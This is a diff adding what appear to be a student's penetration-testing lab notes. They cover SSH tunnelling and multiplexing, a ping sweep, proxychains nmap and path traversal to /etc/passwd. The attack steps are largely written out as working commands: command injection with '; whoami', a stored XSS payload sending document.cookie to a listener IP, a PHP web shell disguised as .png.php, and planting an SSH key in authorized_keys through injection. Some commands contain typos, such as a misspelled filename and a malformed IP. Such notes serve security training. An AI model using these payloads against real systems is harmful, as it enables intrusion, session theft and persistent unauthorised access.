@@ -14,6 +14,124 @@ ssh -S /tmp/jump jump -O forward -D 9050
 ssh -S /tmp/jump jump -O forward -L1111:10.50.12.21:22 -L1112:20.50.12.21:80
 ssh -S /tmp/jump jump -O cancel -L1111:10.50.12.21:22 -L1112:20.50.12.21:80
 
+
+### stealthy multiplexer
+ssh -MS /tmp/jump -fN agent@10.50.16.1 # this will create a backgrounded master shell
+
+ssh -S /tmp/jump session1 # this is calling the socket
+ssh -S /tmp/jump session2 # this is calling the socket
+###
+
+
+###demo1 - experienced an issue with /tmp/ .. use a perm dir.
+create master socket
+ssh -MS /tmp/demo demo1@10.50.12.21 -nF 2>/dev/null
+ssh -S /tmp/demo demo1@10.50.12.21
+
+
+host enumeration, ping sweep (from remote box)
+for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
+
+64 bytes from 10.208.50.1: icmp_seq=1 ttl=64 time=0.147 ms
+64 bytes from 10.208.50.42: icmp_seq=1 ttl=64 time=0.424 ms # target
+64 bytes from 10.208.50.61: icmp_seq=1 ttl=64 time=0.404 ms
+64 bytes from 10.208.50.200: icmp_seq=1 ttl=64 time=0.035 ms
+64 bytes from 10.208.50.230: icmp_seq=1 ttl=128 time=0.498 ms
+
+#port enumeration with dynamic and proxychains
+ssh -S /tmp/demo demo -O forward -D 9050 # on lin-ops
+
+port 22/80
+
+#build tunnel to it //
+ssh -S /tmp/demo demo -O forward -L 42070:10.200.50.42:80 
+
+#go to browser , localhost:42070
+
+http enumeration
+proxychains nmap --script=http-enum 10.200.50.42 80
+ // copy output here && check /robots.txt
+
+when you you go to the /paths/ for example open the terminal .. go to network
+when a prompt shows up to upload a file.. you can do like ../../../../../etc/passwd | ../../../../../etc/hosts
+
+#cmd inject uses semi-colin to run commands (not an active shell, cant cd)
+; whoami
+
+#javascript
+open inspector
+find js by looking for functions (
+open console in inspector and run js manually, for example: changetext() / in console
+
+# steal cookies
+/chat
+we will store our stored process scripting
+setup nc listener: nc -lk <your ip from lin-ops (ifconfig)> 42071 # where you want to inercept cookie
+# post to chat...
+<script>document.location="http://10.50.187.57:52071/username=" + document.cookie;</script>
+
+
+# malicious upload requeires 1. upload 2. find uploads 3. call upload
+
+  <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+- put in a .png.php
+
+
+
+# ssh key gen ( very important )
+cat /etc/passwd .. look for /bash
+
+-- generate our key # run all on lin-ops
+ssh-keygen -t rsa -b 4096 # enter for default option
+No Passphrase
+
+cat /home/student/.ssh/id_rsa.pub
+
+
+# from remote machine / target - command injection
+# make dir and verify
+; mkdir /var/www/.ssh
+; ls -la /var/www
+
+#upload key and verify - still on target
+; echo "" > /var/www/.ssh/authirized_keys #paste whole key into echo "<key>"
+; cat /var/www/.ssh/authorized_keys
+
+
+now 
+ssh -S /tmp/demo demo -O cancel -L42071:10.208.50.42:80
+
+ssh -S /tmp/demo demo -O forward -L42071:10.208.50.42:22
+ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -FN 2>/dev/null
+# specify key using -i
+ssh -MS /tmp/t1 -i <key> www-data@127.00.1 -p 52071 -fN 2>/dev/null
+ssh -S /tmp/t1 t1 www-data@127.0.0.1
+
+to verify port works: nc 127.0.0.1 42071
+
+
+
+
+
+
+
+
+
+
+
+
 Data to Collect
 Web Data
 
